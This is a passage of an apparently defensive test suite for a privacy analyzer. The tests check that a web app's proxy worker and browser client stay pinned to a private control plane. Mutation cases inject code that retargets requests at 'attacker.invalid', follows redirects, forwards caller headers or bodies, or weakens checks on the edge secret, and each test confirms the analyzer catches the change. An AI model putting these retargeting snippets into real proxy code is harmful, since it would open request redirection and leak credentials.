    "const CANARY_APPROVAL_PROJECTION_ROUTE = new RegExp(",
    "const CANARY_RUN_ROUTE = new RegExp(",
    "const CANARY_RUN_EVENTS_ROUTE = new RegExp(",
    "const CANARY_RUN_APPROVE_ROUTE = new RegExp(",
    "const CANARY_RUN_STOP_ROUTE = new RegExp(",
    "const CANARY_DISCLOSURE_PERMIT_ROUTE = new RegExp(",
    "const CANARY_DISCLOSURE_LOCAL_ROUTE = new RegExp(",
    "const CANARY_FINDINGS_ROUTE = new RegExp(",
    "const RUNNER_RESULT_PROJECTION = new RegExp(",
    "const MAX_RUNNER_RESULT_PROJECTION_BODY_BYTES = 272 * 1024;",
    "const RUNNER_NEXT_NONCE = /^[A-Za-z0-9+/]{43}=$/;",
    "const humanCanary = isHumanCanaryRoute(method, upstreamPath);",
    "const runnerResultProjection = RUNNER_RESULT_PROJECTION.test(upstreamPath);",
    'headers.set("If-Heel-Control-Generation", controlGeneration);',
    'if (!CANARY_IDEMPOTENCY_KEY.test(idempotencyKey)) throw new InvalidControlPlaneRequest();\n    headers.set("Idempotency-Key", idempotencyKey);',
  ]) assert.equal(worker.split(fragment).length - 1, 1, `missing exact ${fragment}`);

  assert.doesNotMatch(worker, /startsWith\("\/v1\/.*(?:runs|jobs|targets)/);
});


test("the privacy analyzer tracks the private request URL, options and configuration guards to the sink", async () => {
  const worker = await source("worker/index.ts");
  const analyze = (text) => analyzeSource(join(appRootPath, "worker/index.ts"), text);
  assert.deepEqual(analyze(worker), []);
  const url = "  const upstreamUrl = new URL(upstreamPath, controlPlaneOrigin);";
  const sink = "    const response = await env.CONTROL_PLANE.fetch(new Request(upstreamUrl, init));";
  const contract = "  const upstreamUrl = new URL(upstreamPath, controlPlaneOrigin);\n  const init:";
  const secret = "  const edgeAuthSecret = env.CONTROL_PLANE_EDGE_SECRET.trim();";
  const mutate = (anchor, replacement) => {
    assert.equal(worker.split(anchor).length, 2, `mutation anchor is not unique: ${anchor}`);
    return worker.replace(anchor, replacement);
  };
  const afterUrl = (statement) => mutate(url, `${url}\n  ${statement}`);
  const beforeSink = (statement) => mutate(sink, `    ${statement}\n${sink}`);
  const destination = "destination URL is mutated, aliased or escapes";
  const options = "request options are overridden, aliased or escape";
  const mutations = [
    ["caller URL host", afterUrl("upstreamUrl.hostname = new URL(request.url).hostname;"), destination],
    ["caller Host header", afterUrl('upstreamUrl.host = request.headers.get("Host") ?? "attacker.invalid";'), destination],
    ["caller query", afterUrl("upstreamUrl.search = new URL(request.url).search;"), destination],
    ["fixed path", afterUrl('upstreamUrl.pathname = "/v1/admin";'), destination],
    ["whole href", afterUrl("upstreamUrl.href = request.url;"), destination],
    ["computed member", afterUrl('upstreamUrl["host"] = "attacker.invalid";'), destination],
    ["query parameters", afterUrl('upstreamUrl.searchParams.set("destination", "attacker.invalid");'), destination],
    ["port", afterUrl('upstreamUrl.port = "8443";'), destination],
    ["Object.assign escape", afterUrl('Object.assign(upstreamUrl, { host: "attacker.invalid" });'), destination],
    ["call escape", afterUrl("retargetControlPlane(upstreamUrl, request);"), destination],
    ["alias", afterUrl('const destination = upstreamUrl;\n  destination.host = "attacker.invalid";'), destination],
    ["destructuring alias", afterUrl("const [destination] = [upstreamUrl];"), destination],
    ["closure escape", afterUrl('const retarget = () => { upstreamUrl.host = "attacker.invalid"; };'), destination],
    ["route path reassignment", mutate(url, `  upstreamPath = "/v1/admin";\n${url}`), "route path is reassigned"],
    ["redirect override", beforeSink('init.redirect = "follow";'), options],
    ["header override", beforeSink("init.headers = request.headers;"), options],
    ["framing override", beforeSink("init.body = request.body;"), options],
    ["method override", beforeSink('init.method = "DELETE";'), options],
    ["computed option", beforeSink('init["redirect"] = "follow";'), options],
    ["deleted option", beforeSink("delete init.redirect;"), options],
    ["Object.assign options", beforeSink('Object.assign(init, { redirect: "follow" });'), options],
    ["options alias", beforeSink('const options = init;\n    options.redirect = "follow";'), options],
    ["duplicate literal option", mutate('    redirect: "manual",\n', '    redirect: "manual",\n    redirect: "follow",\n'), options],
    ["spread literal option", mutate('    redirect: "manual",\n', '    redirect: "manual",\n    ...request,\n'), options],
    [
      "header object mutation",
      mutate(contract, '  requestContract.headers.set("Host", "attacker.invalid");\n' + contract),
      "request contract is overridden, aliased or escapes",
    ],
    [
      "request contract replacement",
      mutate(contract, "  requestContract = { headers: request.headers, contentLength: 0 };\n" + contract),
      "request contract is overridden, aliased or escapes",
    ],
    [
      "binding presence only",
      mutate(
        "    env.CONTROL_PLANE === undefined\n    || env.CONTROL_PLANE === null\n    || typeof env.CONTROL_PLANE.fetch !== \"function\"\n",
        "    env.CONTROL_PLANE === undefined\n",
      ),
      "binding capability is not validated",
    ],
    [
      "binding null accepted",
      mutate("    || env.CONTROL_PLANE === null\n", ""),
      "binding capability is not validated",
    ],
    [
      "binding callability unchecked",
      mutate('    || typeof env.CONTROL_PLANE.fetch !== "function"\n', ""),
      "binding capability is not validated",
    ],
    [
      "capability guard moved",
      mutate("  return proxyError(503, \"control plane unavailable\", csp);\n  }\n  // The private", "  return proxyError(503, \"control plane unavailable\", csp);\n  }\n  const moved = typeof env.CONTROL_PLANE.fetch;\n  // The private"),
      "network sink capability reference fetch",
    ],
    [
      "secret type unchecked",
      mutate(`  ${controlPlaneSecretGuard}\n${secret}`, '  const edgeAuthSecret = env.CONTROL_PLANE_EDGE_SECRET?.trim() ?? "";'),
      "edge secret type is not validated",
    ],
    [
      "secret type weakened",
      mutate('typeof env.CONTROL_PLANE_EDGE_SECRET !== "string"', 'env.CONTROL_PLANE_EDGE_SECRET === undefined'),
      "edge secret type is not validated",
    ],
    [
      "secret read elsewhere",
      mutate(secret, `${secret}\n  const rawSecret = env.CONTROL_PLANE_EDGE_SECRET;`),
      "edge secret type is not validated",
    ],
  ];
  assert.equal(new Set(mutations.map(([label]) => label)).size, mutations.length);
  for (const [label, mutated, violation] of mutations) {
    assert.notEqual(mutated, worker, `${label} mutation did not apply`);
    const violations = analyze(mutated);
    assert.ok(violations.some((found) => found.includes(violation)), `${label}: ${violations.join("\n")}`);
  }

  // Positive controls: source changes that leave the sink values untouched stay accepted, so a
  // blanket refusal of any changed proxy cannot satisfy the mutations above.
  for (const [label, unchanged] of [
    ["comment", afterUrl("// The destination is now final.")],
    ["unrelated local", afterUrl('const unrelatedLabel = "control-plane";')],
    ["declared length read", mutate(sink, `    const declaredLength = requestContract.contentLength;\n${sink}`)],
  ]) {
    assert.notEqual(unchanged, worker, `${label} control did not apply`);
    assert.deepEqual(analyze(unchanged), [], label);
  }
});


test("the privacy analyzer pins the browser client to the same-origin closed control plane", async () => {
  const client = await source("lib/heel-cloud-api.ts");
  assert.deepEqual(analyzeSource(join(appRootPath, "lib/heel-cloud-api.ts"), client), []);
  const mutations = [
    {
      label: "external fetch",
      source: client.replace("return fetch(path, init);", 'return fetch("https://attacker.invalid", init);'),
      violation: "network sink",
    },
    {
      label: "query acceptance",
      source: client.replace(' || path.includes("?")', ""),
      violation: "path.includes",
    },
    {
      label: "cross-origin credentials",
      source: client.replace('credentials: "same-origin",', 'credentials: "include",'),
      violation: "credentials",
    },
    {
      label: "redirect following",
      source: client.replace('redirect: "error",', 'redirect: "follow",'),
      violation: "redirect",
    },
  ];
  for (const mutation of mutations) {
    assert.notEqual(mutation.source, client, `${mutation.label} mutation did not apply`);
    const violations = analyzeSource(join(appRootPath, "lib/heel-cloud-api.ts"), mutation.source);
    assert.ok(
      violations.some((violation) => violation.includes(mutation.violation)),
      `${mutation.label}: ${violations.join("\n")}`,
    );
  }
});


test("recursive source discovery finds nested originals and excludes tests and vendor trees", async () => {
  const temporary = await mkdtemp(join(tmpdir(), "heel-privacy-walker-"));
  try {
    await mkdir(join(temporary, "app/deep/feature"), { recursive: true });
    await mkdir(join(temporary, "app/node_modules/vendor"), { recursive: true });
    await writeFile(join(temporary, "app/deep/feature/new-source.ts"), "export const value = 1;", "utf8");
    await writeFile(join(temporary, "app/deep/feature/new-source.test.ts"), "ignored", "utf8");
    await writeFile(join(temporary, "app/node_modules/vendor/hidden.ts"), "ignored", "utf8");

    const files = await discoverOriginalSources(temporary, ["app"]);
    assert.deepEqual(files.map((file) => relative(temporary, file)), [
      join("app", "deep", "feature", "new-source.ts"),
    ]);
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});


test("pins worker boot to same-origin runtime assets and revokes ambient network/package APIs", async () => {
  const worker = await source("workers/heel-review.worker.ts");

  assert.match(worker, /["']\/heel-runtime\/pyodide\.mjs["']/);
  assert.match(worker, /["']\/heel-runtime\/runtime-manifest\.json["']/);
  assert.match(worker, /crypto\.subtle\.digest\(["']SHA-256["']/);
  assert.match(worker, /wheel\.sha256/);
  assert.match(worker, /wheel\.size/);
  assert.match(worker, /unpackArchive/);
  assert.match(worker, /loadPackage/);
  assert.match(worker, /loadPackagesFromImports/);
  for (const capability of ["fetch", "XMLHttpRequest", "WebSocket", "EventSource"]) {
    assert.match(worker, new RegExp(`guard.*${capability}|${capability}.*guard`, "is"));
  }
  assert.match(worker, /MAX_BROWSER_RESULT_BYTES/);
  assert.doesNotMatch(worker, /https?:\/\/|unpkg|jsdelivr|pypi\.org|["']micropip["']|\/api\/review/i);
});


test("attaches a strict CSP and browser security headers to app and image responses", async () => {
  const worker = await source("worker/index.ts");

  assert.match(worker, /Content-Security-Policy/);
  for (const directive of [
    "default-src 'self'",
    "base-uri 'none'",
    "connect-src 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "object-src 'none'",
    "script-src 'self'",
    "worker-src 'self'",
    "'wasm-unsafe-eval'",
  ]) {
    assert.match(worker, new RegExp(directive.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  }
  assert.match(worker, /Referrer-Policy[^\n]+no-referrer/);
  assert.match(worker, /X-Content-Type-Options[^\n]+nosniff/);
  assert.match(worker, /X-Frame-Options[^\n]+DENY/);
  assert.match(worker, /Permissions-Policy/);
  assert.match(worker, /handleImageOptimization/);
  assert.match(worker, /withSecurityHeaders/);
  assert.doesNotMatch(worker, /connect-src[^;\n]*(https?:|\*)/);
  assert.doesNotMatch(worker, /worker-src[^;\n]*(https?:|\*)/);
});
